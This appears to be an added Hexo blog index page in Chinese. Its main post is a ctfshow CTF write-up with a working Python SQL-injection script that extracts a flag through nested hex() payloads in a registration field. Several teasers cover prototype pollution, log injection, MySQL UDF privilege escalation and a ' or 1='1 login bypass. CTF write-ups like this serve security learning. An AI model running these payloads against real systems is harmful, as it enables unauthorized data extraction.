@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>y0lo&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="y0lo&#39;s blogs">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="y0lo&#39;s blogs">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="y0lo's blogs" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">y0lo&#39;s blogs</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-ctfshow内部赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/02/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/" class="article-date">
+  <time class="dt-published" datetime="2022-03-02T13:57:23.798Z" itemprop="datePublished">2022-03-02</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctf/">ctf</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/03/02/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">ctfshow内部赛</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ctfshow内部赛"><a href="#ctfshow内部赛" class="headerlink" title="ctfshow内部赛"></a>ctfshow内部赛</h1><p>最近想多刷一些题，就先从ctfshow的题目下手吧。</p>
+<h1 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h2 id="蓝瘦"><a href="#蓝瘦" class="headerlink" title="蓝瘦"></a>蓝瘦</h2><h2 id="出题人不想跟你说话-jpg"><a href="#出题人不想跟你说话-jpg" class="headerlink" title="出题人不想跟你说话.jpg"></a>出题人不想跟你说话.jpg</h2><h2 id="一览无余"><a href="#一览无余" class="headerlink" title="一览无余"></a>一览无余</h2><h2 id="登录就有flag"><a href="#登录就有flag" class="headerlink" title="登录就有flag"></a>登录就有flag</h2><h2 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h2><hr>
+<h2 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a>签到</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一道sql注入题目，只能说自己还有很多注入的姿势还没掌握。</p>
+<p>后来查资料看到了这题类似[网鼎杯 2018 unfinish]</p>
+<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>进入环境用<code>dirsearch</code>扫了一下，发现有<code>login.php、register.php、www.zip、user.php</code></p>
+<p><img src="/image-20210228123048630.png" alt="image-20210228123048630"></p>
+<p>就把源码下载了下来</p>
+<p>register.php：</p>
+<p><img src="/image-20210228123159617.png" alt="image-20210228123159617"></p>
+<p>源码中对很多关键词都进行了过滤</p>
+<p>user.php：</p>
+<p><img src="/image-20210228123744169.png" alt="image-20210228123744169"></p>
+<p>可以看到对用户名是否数字进行了判断，并且对长度进行了截取，会在返回值中返回<code>username</code>，所以我们就可以利用<code>username</code>进行回带值，注入点是在<code>register.php</code>传入的username中。</p>
+<h4 id="看一些sql语句"><a href="#看一些sql语句" class="headerlink" title="看一些sql语句"></a>看一些sql语句</h4><p><img src="/image-20210228124937579.png" alt="image-20210228124937579"></p>
+<p>如果用了<code>hex</code></p>
+<p><img src="/image-20210228125158298.png" alt="image-20210228125158298"></p>
+<p>但是还有个问题：</p>
+<p><img src="/image-20210228125452752.png" alt="image-20210228125452752"></p>
+<p><img src="/image-20210228125605735.png" alt="image-20210228125605735"></p>
+<p>可以发现<code>flag</code>在hex编码之后被截断了</p>
+<p>这个题要求的是纯数字，所以可以进行两次<code>hex</code>编码</p>
+<p><img src="/image-20210228125903954.png" alt="image-20210228125903954"></p>
+<p>由于前面对<code>username</code>回带的长度进行了截取，所以我们只能一次十位回带<code>flag</code>。</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url1 = <span class="string">&quot;http://3c7fe459-38fe-472f-90e2-eb144496bd2c.chall.ctf.show:8080/register.php&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://3c7fe459-38fe-472f-90e2-eb144496bd2c.chall.ctf.show:8080/login.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    payload=<span class="string">&quot;hex(hex(substr((select/**/flag/**/from/**/flag)from/**/&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;/**/for/**/1))),/*&quot;</span></span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    s=requests.session()</span><br><span class="line">    data1=&#123;</span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>:<span class="built_in">str</span>(i+<span class="number">30</span>)+<span class="string">&quot;&#x27;,username=&quot;</span>+payload,</span><br><span class="line">        <span class="string">&#x27;u&#x27;</span>:<span class="string">&quot;*/#&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;p&#x27;</span>:i+<span class="number">30</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">print</span>(data1[<span class="string">&#x27;e&#x27;</span>])</span><br><span class="line">    r1 = s.post(url1,data=data1)  </span><br><span class="line">    data2=&#123;</span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>:i+<span class="number">30</span>,</span><br><span class="line">        <span class="string">&#x27;p&#x27;</span>:i+<span class="number">30</span></span><br><span class="line">        &#125;</span><br><span class="line">    r2=s.post(url2,data=data2)</span><br><span class="line">    t =r2.text</span><br><span class="line">    real = re.findall(<span class="string">&quot;Hello (.*?),&quot;</span>,t)[<span class="number">0</span>]</span><br><span class="line">    flag+=real</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/03/02/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/" data-id="cl09mim2z000a1kvj7npu6884" data-title="ctfshow内部赛" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="&#39;java-Security的学习" class="h-entry article article-type-&#39;java" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time class="dt-published" datetime="2022-03-02T13:04:05.000Z" itemprop="datePublished">2022-03-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/">Security的学习&#39;</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="cl09mim2w00061kvj6wm5561l" data-title="Security的学习&#39;" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-浅谈nodejs原型链污染" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/04/10/%E6%B5%85%E8%B0%88nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="article-date">
+  <time class="dt-published" datetime="2021-04-10T07:27:13.000Z" itemprop="datePublished">2021-04-10</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/security/">security</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/04/10/%E6%B5%85%E8%B0%88nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="0x01-原型prototype"><a href="#0x01-原型prototype" class="headerlink" title="0x01 原型prototype"></a>0x01 原型prototype</h2><p>​        在<code>js</code>中我们所创建的每一个函数，解析器都会向函数中添加一个属性<code>prototype</code> ，这个属性对应着一个对象，这个对象就是我们所谓的原型对象。如果函数作为普通函数调用prototype没有任何作用。原型对象就相当于一个公共的区域，所有同一个类的实例都可以访问到这个原型对象，我们可以将对象中公有的内容统一设置到原型对象中，当我们访问对象的一个属性或方法时，它会先在自身中寻找，如果有则直接使用，如果没有则会去原型对象中寻找，如果找到则直接使用。</p>
+        
+          <p class="article-more-link">
+            <a href="/2021/04/10/%E6%B5%85%E8%B0%88nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/04/10/%E6%B5%85%E8%B0%88nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" data-id="cl09mim3e000z1kvj85k0ebw8" data-title="原型链污染" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-VNCTF-realezjvav复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time class="dt-published" datetime="2021-03-16T13:11:37.000Z" itemprop="datePublished">2021-03-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/">[VNCTF2021]realezjvav复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自己太菜了，VNCTF没做出来几个题，签到即退场。</p>
+<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>简单的SQL注入</p>
+<p>fastjson Rce复现 </p>
+        
+          <p class="article-more-link">
+            <a href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/" data-id="cl09mim2y00091kvj8x6g95dj" data-title="[VNCTF2021]realezjvav复现" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Python学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/03/12/Python%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time class="dt-published" datetime="2021-03-12T14:53:32.000Z" itemprop="datePublished">2021-03-12</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python/">python</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/03/12/Python%E5%AD%A6%E4%B9%A0/">Python学习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Python小程序"><a href="#Python小程序" class="headerlink" title="Python小程序"></a>Python小程序</h1><p>最近学习python，打算写一些小程序，放到这里总结一下。</p>
+        
+          <p class="article-more-link">
+            <a href="/2021/03/12/Python%E5%AD%A6%E4%B9%A0/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/12/Python%E5%AD%A6%E4%B9%A0/" data-id="cl09mim2p00011kvj0mfj4zka" data-title="Python学习" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-misc刷题记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="article-date">
+  <time class="dt-published" datetime="2021-03-11T13:24:29.000Z" itemprop="datePublished">2021-03-11</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctf/">ctf</a>►<a class="article-category-link" href="/categories/ctf/misc/">misc</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">misc刷题记录</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="misc刷题记录"><a href="#misc刷题记录" class="headerlink" title="misc刷题记录"></a>misc刷题记录</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近刷了刷misc题，改变了自己原来对misc的看法，发现misc也超级有意思</p>
+        
+          <p class="article-more-link">
+            <a href="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" data-id="cl09mim32000e1kvj7z602xpd" data-title="misc刷题记录" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-算法学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/03/11/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time class="dt-published" datetime="2021-03-11T13:24:29.000Z" itemprop="datePublished">2021-03-11</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/03/11/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/">算法学习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="算法学习之旅"><a href="#算法学习之旅" class="headerlink" title="算法学习之旅"></a>算法学习之旅</h1><h2 id="3-9算法分析学习"><a href="#3-9算法分析学习" class="headerlink" title="3.9算法分析学习"></a>3.9算法分析学习</h2><h3 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h3>
+        
+          <p class="article-more-link">
+            <a href="/2021/03/11/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/11/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/" data-id="cl09mim3f00101kvj90py89t3" data-title="算法学习" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Log-injection" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/27/Log-injection/" class="article-date">
+  <time class="dt-published" datetime="2021-02-27T06:54:21.000Z" itemprop="datePublished">2021-02-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/27/Log-injection/">Log injection</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>环境：CTFshow web4</p>
+<h1 id="日志注入漏洞"><a href="#日志注入漏洞" class="headerlink" title="日志注入漏洞"></a>日志注入漏洞</h1><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>1、题目hint：日志注入 文件包含</p>
+<p>2、日志文件：本题中日志默认地址<code>/var/log/nginx/access.log</code></p>
+        
+          <p class="article-more-link">
+            <a href="/2021/02/27/Log-injection/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/27/Log-injection/" data-id="cl09mim2j00001kvjhrw41etu" data-title="Log injection" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-mysql数据库udf提权" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/23/mysql%E6%95%B0%E6%8D%AE%E5%BA%93udf%E6%8F%90%E6%9D%83/" class="article-date">
+  <time class="dt-published" datetime="2021-01-23T07:34:30.000Z" itemprop="datePublished">2021-01-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/23/mysql%E6%95%B0%E6%8D%AE%E5%BA%93udf%E6%8F%90%E6%9D%83/">mysql数据库udf提权</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="mysql数据库udf提权"><a href="#mysql数据库udf提权" class="headerlink" title="mysql数据库udf提权"></a>mysql数据库udf提权</h1><h2 id="mysql数据库udf提权步骤"><a href="#mysql数据库udf提权步骤" class="headerlink" title="mysql数据库udf提权步骤"></a>mysql数据库udf提权步骤</h2><p>UDF(user defined function)，即用户自定义函数。通过添加新函数，对MySQL数据库的功能进行扩充，就像使用本地MySQL函数如 database() 或 version() 一样。</p>
+        
+          <p class="article-more-link">
+            <a href="/2021/01/23/mysql%E6%95%B0%E6%8D%AE%E5%BA%93udf%E6%8F%90%E6%9D%83/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/23/mysql%E6%95%B0%E6%8D%AE%E5%BA%93udf%E6%8F%90%E6%9D%83/" data-id="cl09mim34000g1kvjaixi0l3u" data-title="mysql数据库udf提权" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-SQL注入之万能密码" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/" class="article-date">
+  <time class="dt-published" datetime="2021-01-08T03:36:41.000Z" itemprop="datePublished">2021-01-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/">SQL注入之万能密码</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入之万能密码"><a href="#SQL注入之万能密码" class="headerlink" title="SQL注入之万能密码"></a>SQL注入之万能密码</h1><p><code>&#39; or 1=&#39;1</code></p>
+<p>这是最简的万能密码了，今天记录一种看到的新的万能密码。</p>
+<p>当or、and以及注释符号被严格过滤时，便可以选择这种万能密码</p>
+        
+          <p class="article-more-link">
+            <a href="/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/" data-id="cl09mim2v00051kvj0uje1dwv" data-title="SQL注入之万能密码" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/misc/">misc</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">注入</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/03/02/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">ctfshow内部赛</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/">Security的学习&#39;</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/10/%E6%B5%85%E8%B0%88nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/">[VNCTF2021]realezjvav复现</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/12/Python%E5%AD%A6%E4%B9%A0/">Python学习</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
